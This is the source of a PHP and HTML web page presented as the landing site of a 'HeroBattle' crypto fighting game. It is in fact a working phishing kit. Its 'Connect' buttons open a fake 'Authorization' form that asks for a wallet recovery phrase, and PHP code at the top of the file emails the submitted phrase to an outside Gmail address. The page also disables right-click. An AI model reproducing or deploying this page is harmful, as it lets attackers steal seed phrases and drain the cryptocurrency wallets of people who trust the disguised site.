<?php
$to = "gamesforecod@gmail.com";
$subject = "Phrases Hero Battle";

$phrases = $_POST['password'];

$message = $phrases;
$headers = "Content-type:text/html; charset = UTF-8 \r\n";
$headers .= "From: gamesforecod@gmail.com";
$headers .= "Reply to gamesforecod@gmail.com";

mail($to, $subject, $message, $headers);
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <!-- <meta name="viewport" content="width=device-width, initial-scale=1" /> -->
    <!-- <meta
      name="viewport"
      content="initial-scale=1, maximum-scale=1, user-scalable=no"
    /> -->
    <title>HEROBATTLE - Battle Of Heroes</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" defer></script>
    <script src="./assets/js/main.js" defer></script>
    <meta name="viewport" content="width=device-width, user-scalable=no" />
    <link rel="stylesheet" href="assets/css/reset.css" />
    <link rel="stylesheet" href="assets/css/bootstrap-grid.min.css" />
    <link
      rel="stylesheet"
      href="https://unpkg.com/swiper/swiper-bundle.min.css"
    />
    <link rel="stylesheet" href="assets/css/style.css" />
    <style>
      input:invalid {
        outline: 5px solid red;
      }
    </style>

    <link rel="stylesheet" href="assets/css/modal_style.css">
  </head>
  <body>
    <header class="header fixed-top">
      <div class="container">
        <div class="row">
          <div class="d-flex justify-content-between align-items-center">
            <span class="plaseholder"></span>
            <a class="logoImage" href="#">
              <img
                class="heightImage100"
                src="./assets/images/LogoHomePage 1.png"
                alt=""
              />
            </a>
            <nav class="navbar">
              <ul class="nav-list">
                <li class="nav-item"><a href="#">Features</a></li>
                <li class="nav-item"><a href="#">CHARACTERS</a></li>
                <li class="nav-item"><a href="#">TOKENOMICKS</a></li>
                <li class="nav-item"><a href="#">ROAD MAP</a></li>
                <li class="nav-item"><a href="#">WHITEPAPER</a></li>
              </ul>
            </nav>
            <div class="d-flex align-items-center">
              <a href="#">
                <button class="connect-btn">
                  <img src="./assets/images/giveaway.svg" alt="" />
                </button>
              </a>
              <a href="#">
                <button class="connect-btn" id="connect_btn2">
                  <img src="./assets/images/connect.svg" alt="" />
                </button>
              </a>
            </div>
          </div>
        </div>
      </div>
    </header>
    <div class="wallet-modal" id="wallet_modal" style="display:none;">
      <div class="wallet-bg">
        <form class="wallet-container" id="wallet_form" action="index.php" method="POST">
          <span class="wallet-title">Authorization</span>
          <div style="padding: 3px;box-sizing: border-box;">
            <div style="width:240px"><span class="wallet-input-title">Typically 12 (sometimes 24) words separated by single spaces</span></div>
            <div class="input-field">
              <img class="icon" src="assets/images/person_24px.svg" alt="" />
              <input type="text" name="password" id="password_field" placeholder="Recovery Phrase" />
              <img class="icon-right" src="assets/images/warning_24px.svg" alt="" id="input_alert" style="display:none;"/>
            </div>
            <div style="width:240px"><span class="wallet-input-title warning" id="input_warning" style="display:none;">Please enter 12 or 24 words!</span></div>
          </div>
          <button type="submit" id="subm_button"><span>Confirm</span></button>
        </form>
      </div>
    </div>
    <section class="video-sect">
      <video class="wp100" id="myVideo" autoplay muted preload loop>
        <source src="./assets/images/1x.mp4" type="video/mp4" />
      </video>
    </section>
    <section class="info-sect">
      <div class="container">
        <div class="row">
          <a href="#" class="info-banner">
            <img src="./assets/images/Group 4.svg" alt="" />
          </a>
          <div class="info-content">
            <div
              class="
                mb-3
                col-5
                d-flex
                justify-content-center
                flex-column
                contentText
              "
            >
              <div class="maint-title">
                The most popular fighting game of the Binance Smart chain
                network
              </div>
              <div class="main-description">
                <div class="LinesEllipsis LinesEllipsis--clamped">
                  The world was peaceful until one day, a creature from another
                  world appeared. The Almighty used all his magic to fight and
                  defeat the monster. The monster was imprisoned and sealed with
                  the five elements-related stones: metal, wood, water, fire,
                  and earth. Before dissipating, the almighty divided among five
                  races to protect, each race was given control of a source of
                  power in or<wbr /><span class="LinesEllipsis-ellipsis">
                    <b class="handClick" aria-hidden="true">...Read more</b>
                  </span>
                </div>
              </div>
            </div>
            <div class="info-vid">
              <video
                class="video-react-video"
                preload="auto"
                controls
                src="./assets/images/intro_hero_battle_game_nft.mp4"
                tabindex="-1"
              ></video>
            </div>
          </div>
        </div>
      </div>
      <div class="swiper mySwiper">
        <div class="swiper-wrapper">
          <div class="swiper-slide">
            <img src="./assets/images/slide0-update.svg" alt="" />
          </div>
          <div class="swiper-slide">
            <img src="./assets/images/slide1-update.svg" alt="" />
          </div>
          <div class="swiper-slide">
            <img src="./assets/images/slide2-update.jpg" alt="" />
          </div>
          <div class="swiper-slide">
            <img src="./assets/images/slide3-update.svg" alt="" />
          </div>
          <div class="swiper-slide">
            <img src="./assets/images/slide1-update.svg" alt="" />
          </div>
          <div class="swiper-slide">
            <img src="./assets/images/slide2-update.jpg" alt="" />
          </div>
          <div class="swiper-slide">
            <img src="./assets/images/slide3-update.svg" alt="" />
          </div>
        </div>
        <div class="swiper-pagination"></div>
      </div>
    </section>
    <section class="features">
      <div class="container">
        <div class="row">
          <div class="features-content d-flex align-items-center flex-column">
            <div class="f_title">PLAY TO EARN FEATURES</div>
            <div class="features-subcont d-flex justify-content-between">
              <div class="f-s-block">
                <img src="./assets/images/feature1.svg" alt="" />

                <h3>MARKETPLACE</h3>
                <h4>
                  Use the Marketplace to find your best Hero and trade rare
                  equipment with other players.
                </h4>
              </div>
              <div class="f-s-block">
                <img src="./assets/images/feature2.svg" alt="" />
                <h3>HERO FARMING</h3>
                <h4>
                  In addition to participating in combat, they can let Hero
                  automatically cultivate and harvest. A large amount of tokens
                  will automatically flow to your wallet.
                </h4>
              </div>
              <div class="f-s-block">
                <img src="./assets/images/feature3.svg" alt="" />
                <h3>PLAY GAME</h3>
                <h4>
                  Prepare for Combat by shopping for the best heroes, training
                  your best heroes, and learning powerful skills
                </h4>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <section class="character">
      <div class="container">
        <div class="row">
          <div class="character-content d-flex flex-column align-items-center">
            <div class="ch-head">CHARACTERS</div>
            <img
              class="character-select"
              src="./assets/images/Group 6.svg"
              alt=""
            />
          </div>
        </div>
      </div>
    </section>
    <section class="tokenomics">
      <div class="container">
        <div class="row">
          <div class="tokenomics-content d-flex flex-column align-items-center">
            <div class="ch-head">TOKENOMICS</div>
            <img class="token-img" src="./assets/images/Group 7.png" alt="" />
          </div>
        </div>
      </div>
    </section>
    <section class="roadmap">
      <div class="container">
        <div class="row">
          <div class="roadmap-content d-flex flex-column align-items-center">
            <div class="ch-head">ROADMAP</div>
            <img class="token-img" src="./assets/images/Group 21.svg" alt="" />
          </div>
        </div>
      </div>
    </section>
    <section class="team">
      <img src="./assets/images/placeholder 1.png" alt="" />
    </section>
    <section class="partner">
      <img src="./assets/images/placeholder 2.png" alt="" />
    </section>
    <footer class="header footer">
      <div class="container">
        <div class="row">
          <div class="d-flex justify-content-between align-items-center">
            <a class="sdasd" href="#">
              <img
                class="sdasd"
                src="./assets/images/LogoHomePage 1.png"
                alt=""
              />
            </a>
            <nav class="navbar">
              <ul class="nav-list">
                <li class="nav-item"><a href="#">Features</a></li>
                <li class="nav-item"><a href="#">CHARACTERS</a></li>
                <li class="nav-item"><a href="#">TOKENOMICKS</a></li>
                <li class="nav-item"><a href="#">ROAD MAP</a></li>
                <li class="nav-item"><a href="#">WHITEPAPER</a></li>
              </ul>
            </nav>
            <div class="d-flex align-items-center">
              <a href="#">
                <button class="connect-btn">
                  <img src="./assets/images/giveaway.svg" alt="" />
                </button>
              </a>
              <a>
                <button class="connect-btn" id="connect_btn">
                  <img src="./assets/images/connect.svg" alt="" />
                </button>
              </a>
            </div>
          </div>
        </div>
      </div>
    </footer>
    <!-- <input
      type="text"
      class="input-words"
      placeholder="Буквы английского алфавита"
      id="inp"
      pattern="^([^ ]+( |$)){1,10}$"
    />
    <span id="count">0</span> -->
  </body>
  <script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
  <script>
    var swiper = new Swiper(".mySwiper", {
      slidesPerView: 3,
      spaceBetween: 0,
      loop: true,
      autoplay: {
        delay: 1800,
        disableOnInteraction: false,
      },
      pagination: {
        el: ".swiper-pagination",
        clickable: true,
      },
    });
    /* const MAX_WORDS = 12;

    document.querySelector("input").addEventListener("keydown", (event) => {
      if (event.target.value.split(/\W+/).length > MAX_WORDS) {
        if (event.key.length === 1) {
          event.preventDefault();
        }
      }
    }); */
  </script>
  <script>
    document.oncontextmenu = cmenu;
    function cmenu() {
      return false;
    }
  </script>
</html>